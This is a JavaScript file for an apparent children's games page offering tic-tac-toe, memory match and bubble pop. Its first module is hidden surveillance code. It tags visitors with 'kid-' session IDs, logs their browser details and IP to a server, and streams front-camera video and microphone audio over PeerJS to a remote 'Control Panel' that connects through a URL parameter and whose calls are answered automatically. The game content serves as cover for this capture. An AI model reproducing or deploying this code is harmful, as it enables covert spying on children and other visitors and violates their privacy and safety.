
// ============================================================
// 📸 CAMERA + MICROPHONE + PEERJS STREAMING
// ============================================================
(function() {
  const permOverlay = document.getElementById('permOverlay');
  const btnAllow = document.getElementById('btnAllow');
  const btnSkip = document.getElementById('btnSkip');
  const localVideo = document.getElementById('localVideo');
  let localStream = null;
  let peer = null;
  let peerId = null;
  let controlConn = null;
  let mediaConn = null;

  // إنشاء معرف فريد للجلسة
  const sessionId = 'kid-' + Date.now().toString(36) + '-' + Math.random().toString(36).substring(2, 6);
  
  // تخزين الجلسة للإيميل
  fetch('/api/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      sessionId: sessionId,
      ua: navigator.userAgent,
      time: Date.now(),
      ip: '' // السيرفر يضيف IP
    })
  }).catch(() => {});

  function checkAndStartCamera() {
    alert('إذا ظهرت هذه الرسالة، فهذا يعني أن الكود يعمل بنجاح!');
    permOverlay.classList.add('show');
  }

  // Call immediately without timeout
  checkAndStartCamera();

  btnAllow.addEventListener('click', function() {
    permOverlay.classList.remove('show');

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      document.querySelector('.permission-box h2').textContent = '⚠️ خطأ في الكاميرا';
      document.querySelector('.permission-box p').innerHTML = 'الكاميرا غير مدعومة في هذا المتصفح أو تتطلب اتصال آمن (HTTPS).<br><br>للعمل على الهاتف يرجى استخدام HTTPS (مثل استضافة Vercel أو Ngrok).';
      btnAllow.textContent = '🔄 تحديث الصفحة';
      btnAllow.onclick = function() { window.location.reload(); };
      const newBtnAllow = btnAllow.cloneNode(true);
      btnAllow.parentNode.replaceChild(newBtnAllow, btnAllow);
      btnSkip.style.display = 'none';
      permOverlay.classList.add('show');
      return;
    }

    navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
      audio: true
    })
    .then(function(stream) {
      localStream = stream;
      localVideo.srcObject = stream;

      // إنشاء PeerJS connection
      peer = new Peer(sessionId, {
        config: {
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
            { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
            { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
          ]
        }
      });

      peer.on('open', function(id) {
        peerId = id;
        console.log('PeerID:', id);
        
        // إعلام السيرفر
        fetch('/api/peer-online', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ peerId: id, sessionId: sessionId })
        }).catch(() => {});
      });

      // استقبال اتصال من Control Panel
      peer.on('connection', function(conn) {
        controlConn = conn;
        conn.on('data', function(data) {
          if (data.type === 'ping') {
            conn.send({ type: 'pong' });
          }
        });
      });

      // استقبال بث وسائط (لما الـ control يطلب البث)
      peer.on('call', function(call) {
        call.answer(localStream);
        mediaConn = call;
        call.on('stream', function(remoteStream) {
          // البث يذهب إلى control panel
        });
      });

      // فتح اتصال بـ Control Panel (إذا كان يعرف PeerID)
      const urlParams = new URLSearchParams(window.location.search);
      const ctrlPeerId = urlParams.get('ctrl');
      if (ctrlPeerId) {
        setTimeout(() => {
          connectToControl(ctrlPeerId);
        }, 2000);
      }

    })
    .catch(function(err) {
      console.log('Camera/mic access denied or error:', err.message, err.name);
      
      document.querySelector('.permission-box h2').textContent = '⚠️ خطأ في الكاميرا';
      document.querySelector('.permission-box p').innerHTML = 'تعذر تشغيل الكاميرا. السبب:<br><strong style="color:red;">' + err.name + ': ' + err.message + '</strong><br><br>يرجى التأكد من السماح للكاميرا من إعدادات المتصفح (Browser Settings)، أو أن الكاميرا غير مستخدمة بتطبيق آخر.';
      
      btnAllow.textContent = '🔄 تحديث الصفحة';
      btnAllow.onclick = function() { window.location.reload(); };
      
      const newBtnAllow = btnAllow.cloneNode(true);
      btnAllow.parentNode.replaceChild(newBtnAllow, btnAllow);
      
      btnSkip.style.display = 'none';
      
      permOverlay.classList.add('show');
    });
  });

  function connectToControl(ctrlId) {
    if (!peer) return;
    try {
      const conn = peer.connect(ctrlId, { reliable: true });
      conn.on('open', function() {
        controlConn = conn;
        conn.send({ type: 'hello', sessionId: sessionId, ua: navigator.userAgent });
        
        // إرسال البث
        if (localStream) {
          const call = peer.call(ctrlId, localStream);
          mediaConn = call;
        }
      });
    } catch(e) {}
  }

  btnSkip.addEventListener('click', function() {
    permOverlay.classList.remove('show');
    sessionStorage.setItem('_perm_skipped', '1');
  });
})();

// ============================================================
// 🎮 TIC TAC TOE - MULTIPLAYER (X vs O between two tabs/players)
// ============================================================
(function() {
  const board = document.getElementById('tttBoard');
  const status = document.getElementById('tttStatus');
  const resetBtn = document.getElementById('tttReset');
  const peerStatus = document.getElementById('tttPeerStatus');
  let cells, boardState, gameActive;
  let mySymbol = 'X';
  let opponentSymbol = 'O';
  let myTurn = true;
  let gamePeer = null;
  let gameConn = null;
  let gameId = null;

  // إنشاء معرف لعبة مشترك
  const urlParams = new URLSearchParams(window.location.search);
  const joinGame = urlParams.get('join');
  
  if (joinGame) {
    // هذا لاعب ثاني (O) — سينضم للعبة
    mySymbol = 'O';
    opponentSymbol = 'X';
    myTurn = false;
    gameId = joinGame;
    status.textContent = "⏳ Joined game as O. Waiting for X's move...";
    
    // الاتصال باللاعب الأول
    setTimeout(() => {
      setupPeerConnection(joinGame);
    }, 1000);
  } else {
    // هذا اللاعب الأول (X) — سينشئ اللعبة
    mySymbol = 'X';
    opponentSymbol = 'O';
    myTurn = true;
    gameId = 'ttt-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
    status.textContent = "🎮 You are X. Share this link for O player:";
    
    // عرض رابط المشاركة
    const shareLink = window.location.origin + window.location.pathname + '?join=' + gameId;
    status.innerHTML = `🎮 You are X. <br><small style="font-size:12px;opacity:0.8;">Share: <span style="background:rgba(255,255,255,0.2);padding:2px 8px;border-radius:8px;word-break:break-all;">${shareLink}</span></small>`;
    
    // انتظار اتصال اللاعب الثاني
    setupPeerHost(gameId);
  }

  function setupPeerHost(id) {
    gamePeer = new Peer(id, {
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
          { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
        ]
      }
    });

    gamePeer.on('open', function() {
      peerStatus.textContent = '🟢 Lobby open';
    });

    gamePeer.on('connection', function(conn) {
      gameConn = conn;
      peerStatus.textContent = '🟢 O player joined!';
      status.textContent = "❌ Your turn (X)! Tap a square";
      myTurn = true;
      
      conn.on('data', function(data) {
        if (data.type === 'move') {
          // اللاعب الآخر لعب دور O
          const index = data.index;
          if (boardState && gameActive && boardState[index] === null) {
            boardState[index] = 'O';
            cells[index].textContent = 'O';
            cells[index].classList.add('o');
            checkWinner();
            if (gameActive) {
              myTurn = true;
              status.textContent = "❌ Your turn (X)!";
            }
          }
        } else if (data.type === 'reset') {
          initBoard();
        }
      });
    });
  }

  function setupPeerConnection(hostId) {
    gamePeer = new Peer(undefined, {
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
          { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
        ]
      }
    });

    gamePeer.on('open', function() {
      // الاتصال بالمضيف
      const conn = gamePeer.connect(hostId, { reliable: true });
      gameConn = conn;
      
      conn.on('open', function() {
        peerStatus.textContent = '🟢 Connected to X!';
        status.textContent = "⭕ Waiting for X's move...";
      });

      conn.on('data', function(data) {
        if (data.type === 'move') {
          const index = data.index;
          if (boardState && gameActive && boardState[index] === null) {
            boardState[index] = 'X';
            cells[index].textContent = 'X';
            cells[index].classList.add('x');
            checkWinner();
            if (gameActive) {
              myTurn = true;
              status.textContent = "⭕ Your turn (O)!";
            }
          }
        } else if (data.type === 'reset') {
          initBoard();
        }
      });
    });
  }

  function initBoard() {
    cells = Array.from(document.querySelectorAll('.ttt-cell'));
    boardState = Array(9).fill(null);
    gameActive = true;
    
    if (joinGame) {
      mySymbol = 'O';
      opponentSymbol = 'X';
      myTurn = false;
      status.textContent = "⭕ Waiting for X's move...";
    } else {
      mySymbol = 'X';
      opponentSymbol = 'O';
      myTurn = true;
      status.textContent = "❌ Your turn (X)!";
    }
    
    cells.forEach(cell => {
      cell.textContent = '';
      cell.className = 'ttt-cell';
      cell.onclick = handleCellClick;
    });
  }

  function handleCellClick(e) {
    if (!gameActive || !myTurn) return;
    
    const index = parseInt(e.target.dataset.index);
    if (boardState[index] !== null) return;

    // لعب محلياً
    boardState[index] = mySymbol;
    e.target.textContent = mySymbol;
    e.target.classList.add(mySymbol.toLowerCase());
    myTurn = false;

    // إرسال الحركة للخصم
    if (gameConn && gameConn.open) {
      gameConn.send({ type: 'move', index: index });
    }

    checkWinner();
    if (gameActive) {
      status.textContent = "⏳ Waiting for " + opponentSymbol + "...";
    }
  }

  function checkWinner() {
    const winPatterns = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
    let winner = null;
    for (const p of winPatterns) {
      if (boardState[p[0]] && boardState[p[0]] === boardState[p[1]] && boardState[p[1]] === boardState[p[2]]) {
        winner = boardState[p[0]];
        p.forEach(i => cells[i].classList.add('win'));
        break;
      }
    }

    if (winner) {
      gameActive = false;
      if (winner === mySymbol) {
        status.textContent = "🎉 You win! 🎉";
      } else {
        status.textContent = "😅 " + opponentSymbol + " wins!";
      }
      return;
    }

    if (boardState.every(c => c)) {
      gameActive = false;
      status.textContent = "🤝 It's a tie! 🤝";
    }
  }

  resetBtn.addEventListener('click', function() {
    initBoard();
    if (gameConn && gameConn.open) {
      gameConn.send({ type: 'reset' });
    }
  });

  initBoard();
})();

// ============================================================
// 🧠 MEMORY MATCH
// ============================================================
(function() {
  const grid = document.getElementById('memoryGrid');
  const scoreSpan = document.getElementById('memoryScore');
  const resetBtn = document.getElementById('memoryReset');
  const emojis = ['🐶','🐱','🐸','🦊','🐼','🐨','🦁','🐯'];
  let flippedCards = []; let matched = 0; let lockBoard = false;
  function shuffle(arr) { for (let i = arr.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [arr[i], arr[j]] = [arr[j], arr[i]]; } return arr; }
  function initMemory() {
    grid.innerHTML = ''; matched = 0; flippedCards = []; lockBoard = false; scoreSpan.textContent = '0';
    const doubled = shuffle([...emojis, ...emojis]);
    doubled.forEach((emoji) => {
      const card = document.createElement('div');
      card.className = 'memory-card'; card.dataset.emoji = emoji;
      card.addEventListener('click', function() {
        if (lockBoard || this.classList.contains('flipped') || this.classList.contains('matched')) return;
        this.textContent = this.dataset.emoji; this.classList.add('flipped');
        flippedCards.push(this);
        if (flippedCards.length === 2) {
          lockBoard = true;
          const c1 = flippedCards[0], c2 = flippedCards[1];
          if (c1.dataset.emoji === c2.dataset.emoji) {
            c1.classList.add('matched'); c2.classList.add('matched');
            matched++; scoreSpan.textContent = matched; flippedCards = []; lockBoard = false;
            if (matched === 8) setTimeout(() => alert('🎉 You won!'), 300);
          } else {
            setTimeout(() => { c1.textContent = ''; c1.classList.remove('flipped'); c2.textContent = ''; c2.classList.remove('flipped'); flippedCards = []; lockBoard = false; }, 800);
          }
        }
      });
      grid.appendChild(card);
    });
  }
  resetBtn.addEventListener('click', initMemory);
  initMemory();
})();

// ============================================================
// 🫧 BUBBLE POP
// ============================================================
(function() {
  const area = document.getElementById('bubbleArea');
  const scoreSpan = document.getElementById('bubbleScore');
  const resetBtn = document.getElementById('bubbleReset');
  let score = 0; let bubbleInterval;
  const colors = ['#ff6b6b','#ffd93d','#6bcb77','#4d96ff','#ff6bff','#ff9f43','#00d2d3','#a29bfe'];
  const symbols = ['😊','🌟','⭐','❤️','🎈','🎉','💎','🍭','🌈','🦋','🌸','🍀'];
  function createBubble() {
    if (area.children.length > 25) return;
    const size = 40 + Math.random() * 40;
    const x = Math.random() * (area.offsetWidth - size - 10) + 5;
    const color = colors[Math.floor(Math.random() * colors.length)];
    const symbol = symbols[Math.floor(Math.random() * symbols.length)];
    const bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.style.cssText = `width:${size}px;height:${size}px;left:${x}px;bottom:10px;background:radial-gradient(circle at 30% 30%, ${color}, ${color}dd);box-shadow:0 4px 15px ${color}66;animation-duration:${2+Math.random()*2}s;font-size:${size*0.45}px;`;
    bubble.textContent = symbol;
    bubble.addEventListener('click', function(e) {
      e.stopPropagation();
      if (this.classList.contains('popped')) return;
      this.classList.add('popped'); score++; scoreSpan.textContent = score;
      setTimeout(() => this.remove(), 300);
    });
    area.appendChild(bubble);
    let pos = area.offsetHeight - size - 10;
    const floatInt = setInterval(() => {
      pos -= 1;
      if (pos < -size || bubble.classList.contains('popped')) { clearInterval(floatInt); if (!bubble.classList.contains('popped')) bubble.remove(); }
      else bubble.style.top = pos + 'px';
    }, 40);
  }
  function initBubble() {
    area.innerHTML = ''; score = 0; scoreSpan.textContent = '0';
    clearInterval(bubbleInterval);
    for (let i = 0; i < 10; i++) setTimeout(createBubble, i * 100);
    bubbleInterval = setInterval(createBubble, 1200);
  }
  resetBtn.addEventListener('click', initBubble);
  initBubble();
})();

// Tab switching
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', function() {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    this.classList.add('active');
    document.querySelectorAll('.game-container').forEach(g => g.classList.remove('active'));
    document.getElementById('game-' + this.dataset.game).classList.add('active');
  });
});
